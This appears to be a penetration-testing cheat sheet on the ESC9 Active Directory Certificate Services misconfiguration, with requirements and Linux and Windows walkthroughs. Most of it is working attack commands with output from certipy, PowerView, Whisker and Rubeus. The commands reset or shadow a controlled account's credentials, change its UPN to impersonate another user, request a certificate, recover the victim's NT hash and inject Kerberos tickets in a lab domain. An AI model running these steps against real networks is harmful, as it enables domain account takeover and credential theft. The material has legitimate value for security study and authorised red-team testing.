### Content

- [Overview](#overview)
	- [Requirements](#requirements)
- [From Linux](#from-linux)
	- [Linux - Enumeration](#linux---enumeration)
	- [Linux - Abuse](#linux---abuse)
- [From Windows](#from-windows)
	- [Windows - Enumeration](#windows---enumeration)
	- [Windows - Abuse](#windows---abuse)
	- [Extra](#extra)

> Template Misconfiguration. 

---
### Overview

If `msPKI-Enrollment-Flag` attribute of a certificate template contains `CT_FLAG_NO_SECURITY_EXTENSION` flag, the certificates resulted from this template won't have the `szOID_NTDS_CA_SECURITY_EXT` security extension.

This means that the configuration of the `StrongCertificateBindingEnforcement` registry key will be ignored if it equals (1) and the mapping process will occur as if the registry key had a value of `0`.

Which can be exploited if we possess sufficient privileges to access and modify a user account's `User Principal Name (UPN)` to align it with the `UPN` of another account. 

#### Requirements

1. One of the following registry keys: (unprivileged user usually can't read their values)
	1. `StrongCertificateBindingEnforcement` != 2 
	2. `CertificateMappingMethods` should contain the UPN flag (`0x4`).
2. The certificate template has the `CT_FLAG_NO_SECURITY_EXTENSION` flag within the `msPKI-Enrollment-Flag` value.
3. The certificate template has explicit `client authentication` EKU as its purpose.
4. `GenericWrite` privilege against any user account (account A) to compromise the security of any other user account (account B).

---
### From Linux
#### Linux - Enumeration

```bash
# Identifying Vulnerable Templates
certipy find -u 'user@lab.local' -p 'pass' -dc-ip <IP> -vulnerable -stdout
    Template Name                       : ESC9
    Display Name                        : ESC9
    Certificate Authorities             : lab-LAB-DC-CA
    Enabled                             : True
    Client Authentication               : True #<<<<<<<<<<<
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
                                          NoSecurityExtension #<<<<<<<<<<<
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication #<<<<<<<<<<<
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 99 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-05-03T11:21:35+00:00
    Template Last Modified              : 2023-07-05T11:47:33+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Domain Users
                                          LAB.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : LAB.LOCAL\Administrator
        Full Control Principals         : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
        Write Owner Principals          : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
        Write Dacl Principals           : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
        Write Property Enroll           : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Domain Users
                                          LAB.LOCAL\Enterprise Admins
    [+] User Enrollable Principals      : LAB.LOCAL\Domain Users
    [!] Vulnerabilities
      ESC9                              : Template has no security extension.
    [*] Remarks
      ESC9                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
```

#### Linux - Abuse

The scenario:

1. We have compromised user1, which has Full control over user2
	1. Change user2 password or abuse shadow credentials to get his NT hash
2. We are targeting user3
	1. Edit user2 UPN to match user3's UPN
	2. Get a certificate using user2, which will result a working certificate for user3
	3. Revert user2 UPN to avoid UPN mismatch
3. Authenticate using the certificate from point 2.2 as the user3

```bash
# Using DACLEDIT to enumerate user rights
$ dacledit.py -action read -dc-ip <IP> -target <CA_IP> lab.local/user1:pass -principal user1 -target user2

<SNIP>
*] Parsing DACL
[*] Printing parsed DACL
[*] Filtering results for SID (S-1-5-21-2570265163-3918697770-3667495639-1103)
[*]   ACE[24] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE, INHERITED_ACE, OBJECT_INHERIT_ACE
[*]     Access mask               : FullControl (0xf01ff)
[*]     Trustee (SID)             : user1 (S-1-5-21-2570265163-3918697770-3667495639-1103)
<SNIP>

# Retrieve user2 NT Hash via Shadow Credentials
$ certipy shadow auto -u 'user1@lab.local' -p 'pass' -account user2

<SNIP>
[*] Saved credential cache to 'user2.ccache'
[*] NT hash for 'user2': ....
<SNIP>

# Change user2 UPN to user3
$ certipy account update -u 'user1@lab.local' -p 'pass' -user user2 -upn user3@lab.local

# Request vulnerable certipy with user2
$ certipy req -target <CA_IP> -u 'user2@lab.local' -hashes 2b576acbe6bcfda7294d6bd18041b8fe -ca lab-LAB-DC-CA -template ESC9

<SNIP>
[*] Got certificate with UPN 'user3@lab.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'user3.pfx'
<SNIP>

# Revert the UPN that we changed earlier to avoid UPN mismatches
$ certipy account update -u 'user1@lab.local' -p 'pass' -user user2 -upn user2@lab.local

# Authenticate as user3 with the previous certificate
$ certipy auth -pfx user3.pfx -domain lab.local

<SNIP>
[*] Saved credential cache to 'user3.ccache'
[*] Got hash for 'user3@lab.local': ...
<SNIP>
```

---
### From Windows
#### Windows - Enumeration

Using `certify.exe`

```PowerShell
PS C:\> .\Certify.exe find /vulnerable

<SNIP>
    CA Name                               : LAB-DC.lab.local\lab-LAB-DC-CA
    Template Name                         : ESC9
    Schema Version                        : 2
    Validity Period                       : 99 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT, NO_SECURITY_EXTENSION
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : LAB\Domain Admins   
                                      LAB\Domain Users   
                                      LAB\Enterprise Admins  
      Object Control Permissions
        Owner                       : LAB\Administrator  
        WriteOwner Principals       : LAB\Administrator 
                                      LAB\Domain Admins    
                                      LAB\Enterprise Admins  
        WriteDacl Principals        : LAB\Administrator  
                                      LAB\Domain Admins
                                      LAB\Enterprise Admins
        WriteProperty Principals    : LAB\Administrator
                                      LAB\Domain Admins         
                                      LAB\Enterprise Admins         
<SNIP>
```

Enumerate the security controls, by confirming if the `StrongCertificateBindingEnforcement` registry key is not set to `2` (default: `1`) or `CertificateMappingMethods` registry key contains `UPN` flag (`0x4`).:

```PowerShell
PS C:\Tools> reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc

<SNIP>
    StrongCertificateBindingEnforcement    REG_DWORD    0x0
<SNIP>

PS C:\Tools> reg query HKLM\System\CurrentControlSet\Control\SecurityProviders\Schannel\

<SNIP>
    CertificateMappingMethods    REG_DWORD    0x4
<SNIP>
```

> Making these queries from a remote computer with unprivileged user is usually impossible

Use `BloodHound` or `PowerView` to identify which accounts we can control with `GenericWrite` or `GenericAll`.

```PowerShell
# Using PowerView
PS C:\> Import-Module .\PowerView.ps1
PS C:\> $user1=(Get-DomainUser -Identity user1)

PS C:\> Get-DomainObjectAcl -LDAPFilter "(&(objectClass=user)(objectCategory=person))" -ResolveGUIDs | ? {($_.ActiveDirectoryRights -contains "GenericAll" -or $_.ActiveDirectoryRights -contains "GenericWrite") -and $_.SecurityIdentifier -eq $user1.objectsid}

<SNIP>
AceType               : AccessAllowed
ObjectDN              : CN=User2,CN=Users,DC=lab,DC=local
ActiveDirectoryRights : GenericAll
<SNIP>
```

#### Windows - Abuse

1. We have compromised user1, which has Full control over user2
	1. Change user2 password or abuse shadow credentials to get his NT hash
2. We are targeting user3
	1. Edit user2 UPN to match user3's UPN
	2. Get a certificate using user2, which will result a working certificate for user3
3. Authenticate using the certificate from point 2.2 as the user3

Using the compromised user1 to full compromise user2:

```PowerSHell
# Reset user2 password using PowerView
PS C:\> Set-DomainUserPassword -Identity user2 -AccountPassword $((ConvertTo-SecureString 'Newpassword123!' -AsPlainText -Force)) -Verbose

# Change user2 UPN to match user3 UPN
PS C:\> Set-DomainObject user2 -Set @{'userPrincipalName'='user3@lab.local'} -Verbose

# Or
# add a Shadow credentials using Whisker.exe
PS C:\> .\Whisker.exe add /target:user2
<SNIP>
Rubeus.exe asktgt /user:user2 /certificate:MII... /password:"HYnFwBj2beWpp9QL" /domain:lab.local /dc:LAB-DC.lab.local /getcredentials /show
<SNIP>

# Running Rubeus to get the new user's credentials
Rubeus.exe asktgt /user:user2 /certificate:MII... /password:"HYnFwBj2beWpp9QL" /domain:lab.local /dc:LAB-DC.lab.local /getcredentials /show 

<SNIP>
NTLM              : EE22DDF0F8A66DB4217050E6A948F9D6
<SNIP>
```

`certify.exe` can only run in the current user context, getting a session with user2:

1. If `user2` has rights to connect via RDP, execute `Certify` from there.
2. If `user2` has logon rights, try to: 
	1. `Run as different user` from the GUI
	2. Use [RunasCS.exe](https://github.com/antonioCoco/RunasCs) to run specific processes with different permissions than the user's current logon provides using explicit credentials.

From user2 context:

```PowerShell
# Request a Certificate using ESC9 and alternative SAN user3
PS C:\> .\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:ESC9 /altname:user3
```

Convert PEM to PFX with one of the ways specified in the note [PEM to PFX](./PEM%20to%20PFX.md) 

```PowerShell
# Use Rubeus to request a TGT as user3 and also get its NT Hash:
PS C:\> .\Rubeus.exe asktgt /user:user3 /certificate:user3.pfx /getcredentials /nowrap
```

---
#### Extra

Using Rubeus to create a sacrificial logon session then import the Base64 Ticket into the PowerShell session to act as the impersonated user3:

```PowerShell
PS C:\> .\Rubeus.exe createnetonly /program:powershell.exe /show

# In the new spawned shell
PS C:\> .\Rubeus.exe ptt /ticket:doIGQjCCBj6gAwIBBaEDAgEW<SNIP>
```